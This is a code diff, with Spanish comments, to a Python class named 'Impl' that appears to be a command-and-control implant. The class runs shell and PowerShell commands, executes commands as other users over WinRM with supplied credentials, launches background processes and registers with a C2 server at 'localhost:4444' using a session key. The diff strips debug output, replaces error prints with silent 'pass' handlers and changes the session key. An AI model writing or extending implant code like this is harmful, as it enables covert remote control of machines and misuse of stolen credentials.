@@ -149,8 +149,8 @@ class Impl:
                 }, ensure_ascii=False))
 
             except Exception as e:
-                print(e)
-                print("eerr")
+                pass
+                
 
         else:
             out, err, _ = self._execute_shell_command(command)
@@ -184,7 +184,7 @@ class Impl:
             return result
        
         except Exception as e:
-            print("Erro in execute as user")
+            
             return f"Errorr: {e}"
         
 
@@ -196,41 +196,7 @@ class Impl:
             if run_in_background:
                 command.remove("&")
 
-    
-#         # Detectar redirección (> o >>)
-#            output_file = None
-#            append = False
-#            redir_match = re.match(r'(.*?)\s*(>>?)\s*(.+)$', command)
-#            if redir_match:
-#                command = redir_match.group(1).strip()
-#                append = redir_match.group(2) == '>>'
-#                output_file = redir_match.group(3).strip().strip('"')
-#
-#            # Parseo de argumentos con respeto a comillas
-#            parts = shlex.split(command, posix=False)
-#            if not parts:
-#                return "No command provided."
-#
-#            exe = parts[0]
-#            args = parts[1:]
-#
-#            # Verificar si es ejecutable
-#            def is_executable(file):
-#                if os.path.isfile(file):
-#                    return True
-#                for path_dir in os.getenv('PATH', '').split(os.pathsep):
-#                    full_path = os.path.join(path_dir, file)
-#                    if os.path.isfile(full_path) or os.path.isfile(full_path + ".exe"):
-#                        return True
-#                return False
-#
-#            if not is_executable(exe):
-#                exe = "powershell.exe"
-#                args = ["-NoProfile", "-Command", command]
-#
-#            cmd_line = f'"{exe}" ' + ' '.join(f'"{arg}"' for arg in args) 
 
-            print("cmd: ", command)
 
             return await self._execute_winrm_command(
                 command, username, domain, password, "localhost", 
@@ -260,7 +226,7 @@ class Impl:
             )
             
             if run_in_background:
-                print("bg")
+                
                 try:
                 # Para comandos en segundo plano, usar PowerShell Start-Process
                     bg_command = f' {' '.join(f'{arg}' for arg in command)}'
@@ -269,7 +235,7 @@ class Impl:
 
                     result = session.run_ps(bg_command)
 
-                    print(result)
+                    
 
                     if result.status_code == 0:
                         # Extraer PID del resultado
@@ -281,7 +247,7 @@ class Impl:
                         error = result.std_err.decode('utf-8', errors='ignore')
                         return f"ERROR starting background process: {error}"
                 except Exception as e:
-                    print(e)
+                    pass
             
             else:
 
@@ -299,7 +265,7 @@ class Impl:
                         final_output = output
                     
                 except Exception as e:
-                    print(e)
+                    pass
                 # Manejar redirección a archivo
                 if output_file:
                     try:
@@ -734,7 +700,7 @@ class Impl:
             try:
                 req = requests.post(f"http://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),  data=model, timeout=10)
                 
-                if "Invalid session key" in req.content():
+                if "Invalid session key" in req.content().decode():
                     sys.exit(0)
                 
                 if req.status_code == 200:
@@ -797,7 +763,7 @@ if __name__ == "__main__":
 
     C2_WS_URL = "localhost:4444"
     GROUP_NAME = "grupo"
-    SESS_KEY = "12345678910"
+    SESS_KEY = "1234567"
     
     
     impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME, sess_key=SESS_KEY)
